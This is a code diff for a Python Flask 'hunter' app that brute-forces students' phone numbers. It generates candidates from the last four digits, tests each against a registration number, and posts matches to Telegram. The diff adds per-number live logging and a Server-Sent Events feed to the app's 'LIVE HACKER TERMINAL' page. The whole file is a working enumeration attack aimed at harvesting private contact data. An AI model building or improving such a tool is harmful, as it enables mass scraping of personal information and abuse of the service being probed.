@@ -2,7 +2,8 @@ import requests
 import time
 import os
 import threading
-from flask import Flask, jsonify, render_template_string
+import json
+from flask import Flask, jsonify, render_template_string, Response
 
 app = Flask(__name__)
 
@@ -29,7 +30,7 @@ def add_log(text):
     global live_logs
     log_line = f"[{time.strftime('%H:%M:%S')}] {text}"
     live_logs.append(log_line)
-    if len(live_logs) > 40: live_logs.pop(0)
+    if len(live_logs) > 50: live_logs.pop(0)
     print(log_line, flush=True)
 
 def send_telegram_msg(text):
@@ -82,22 +83,21 @@ def process_student(index, reg_no, last4):
     
     found_phone = None
     
-    # 1 BY 1 FAST SCAN (No threads, maximum speed)
     for phone in generate_numbers(last4):
         if found_phone: break
         
         res = check(phone, reg_no)
         total_scanned += 1
         
+        # HAR EK NUMBER KA LIVE LOG
         if res["success"]:
             found_phone = res["phone"]
             add_log(f"✅ MATCH FOUND! Phone: {found_phone}")
             send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
             break
-            
-        # Har 5000 scan pe log dikhao
-        if total_scanned % 5000 == 0:
-            add_log(f"[{total_scanned}/{total_to_scan}] Scanning... Last: {res['phone']} ({res['status']})")
+        else:
+            # Live dikhane ke liye har number print karo
+            add_log(f"[{total_scanned}/{total_to_scan}] 📞 {res['phone']} → Status: {res['status']}")
 
     if not found_phone:
         add_log(f"❌ NO MATCH for {reg_no}")
@@ -123,6 +123,19 @@ def run_hunter():
     except Exception as e:
         add_log(f"Error: {e}")
 
+# Server-Sent Events (SSE) stream route
+@app.route('/stream')
+def stream():
+    def generate():
+        last_index = 0
+        while True:
+            if last_index < len(live_logs):
+                for log in live_logs[last_index:]:
+                    yield f"data: {json.dumps({'log': log})}\n\n"
+                last_index = len(live_logs)
+            time.sleep(0.5)
+    return Response(generate(), mimetype='text/event-stream')
+
 @app.route('/')
 def home():
     return render_template_string("""
@@ -138,41 +151,48 @@ def home():
             .success { color: #00ff00; font-weight: bold; }
             .error { color: #ff3333; }
         </style>
-        <script>
-            setInterval(function() {
-                fetch('/logs').then(r => r.json()).then(data => {
-                    document.getElementById('reg').innerText = data.current_reg;
-                    document.getElementById('scanned').innerText = data.scanned;
-                    document.getElementById('total').innerText = data.total;
-                    let term = document.getElementById('terminal');
-                    term.innerHTML = '';
-                    data.logs.forEach(line => {
-                        let div = document.createElement('div');
-                        div.className = 'log-line';
-                        if(line.includes('✅')) div.classList.add('success');
-                        else if(line.includes('❌') || line.includes('ERROR')) div.classList.add('error');
-                        div.innerText = line;
-                        term.appendChild(div);
-                    });
-                    term.scrollTop = term.scrollHeight;
-                });
-            }, 3000);
-        </script>
     </head>
     <body>
-        <h3>💻 LIVE HACKER TERMINAL</h3>
+        <h3>💻 LIVE HACKER TERMINAL (Real-Time)</h3>
         <div class="stats">
-            <b>Target:</b> <span id="reg" style="color:#fff;">{{ current_reg }}</span><br>
-            <b>Scanned:</b> <span id="scanned" style="color:#fff;">{{ total_scanned }}</span> / <span id="total" style="color:#fff;">{{ total_to_scan }}</span>
+            <b>Target:</b> <span id="reg">Loading...</span><br>
+            <b>Scanned:</b> <span id="scanned">0</span> / <span id="total">0</span>
         </div>
-        <div id="terminal"><div class="log-line">Loading...</div></div>
+        <div id="terminal"></div>
+
+        <script>
+            let term = document.getElementById('terminal');
+
+            // Server Sent Events start karo
+            let source = new EventSource("/stream");
+
+            source.onmessage = function(event) {
+                let data = JSON.parse(event.data);
+                let line = data.log;
+                
+                let div = document.createElement('div');
+                div.className = 'log-line';
+                if(line.includes('✅')) div.classList.add('success');
+                else if(line.includes('❌') || line.includes('ERROR')) div.classList.add('error');
+                div.innerText = line;
+                
+                term.appendChild(div);
+                term.scrollTop = term.scrollHeight;
+
+                // Stats update karo (regex se)
+                if(line.includes('TARGET START:')) {
+                    document.getElementById('reg').innerText = line.split('TARGET START:')[1].trim();
+                }
+                let match = line.match(/\[(\d+)\/(\d+)\]/);
+                if(match) {
+                    document.getElementById('scanned').innerText = match[1];
+                    document.getElementById('total').innerText = match[2];
+                }
+            };
+        </script>
     </body>
     </html>
-    """, current_reg=current_reg, total_scanned=total_scanned, total_to_scan=total_to_scan)
-
-@app.route('/logs')
-def get_logs():
-    return jsonify({"current_reg": current_reg, "scanned": total_scanned, "total": total_to_scan, "logs": live_logs})
+    """)
 
 if __name__ == "__main__":
     threading.Thread(target=run_hunter, daemon=True).start()
